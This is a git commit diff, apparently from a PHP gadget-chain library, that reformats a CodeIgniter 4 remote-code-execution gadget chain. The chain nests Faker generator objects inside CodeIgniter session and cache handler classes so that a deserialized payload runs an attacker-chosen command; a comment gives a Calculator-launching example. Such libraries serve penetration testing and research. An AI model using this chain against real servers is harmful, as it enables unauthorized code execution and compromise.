359682981727cb705a6967a9de451fb382794638
cfreal <folcharles@gmail.com>
2021-10-10 17:42:28 +0200

    CodeIgniter fix

--- gadgetchains/CodeIgniter4/RCE/3/gadgets.php
+++ gadgetchains/CodeIgniter4/RCE/3/gadgets.php
@@ -1,33 +1,42 @@
 <?php
-namespace Faker{
-    class DefaultGenerator{
+
+namespace Faker
+{
+    class DefaultGenerator
+    {
         protected $default;
+        
         public function __construct($cmd)
         {
-            $this->default=$cmd;//open /System/Applications/Calculator.app
+            $this->default = $cmd; //open /System/Applications/Calculator.app
         }
     }
 }
 
-namespace Faker {
-    class ValidGenerator{
+namespace Faker
+{
+    class ValidGenerator
+    {
         protected $generator;
         protected $validator;
         protected $maxRetries;
-        public function __construct($generator,$func)
+
+        public function __construct($generator, $func)
         {
-            $this->maxRetries=1;//执行次数
-            $this->validator=$func;
-            $this->generator=$generator;
+            $this->maxRetries = 1; //执行次数
+            $this->validator = $func;
+            $this->generator = $generator;
         }
     }
 }
 
-namespace CodeIgniter\Session\Handlers {
+namespace CodeIgniter\Session\Handlers
+{
     class MemcachedHandler
     {
         public $lockKey = "Firebasky";
         public $memcached;
+
         public function __construct($memcached)
         {
             $this->memcached = $memcached;
@@ -35,17 +44,18 @@ namespace CodeIgniter\Session\Handlers {
     }
 }
 
-namespace CodeIgniter\Cache\Handlers {
+namespace CodeIgniter\Cache\Handlers
+{
     class RedisHandler
     {
         public $redis;
-        public function __construct($func, $param){
+
+        public function __construct($func, $param)
+        {
             $this->redis =
                 new \CodeIgniter\Session\Handlers\MemcachedHandler(
-                    new \Faker\ValidGenerator((new \Faker\DefaultGenerator($param)),$func)
-            );
+                    new \Faker\ValidGenerator((new \Faker\DefaultGenerator($param)), $func)
+                );
         }
     }
-}
-namespace {
 }
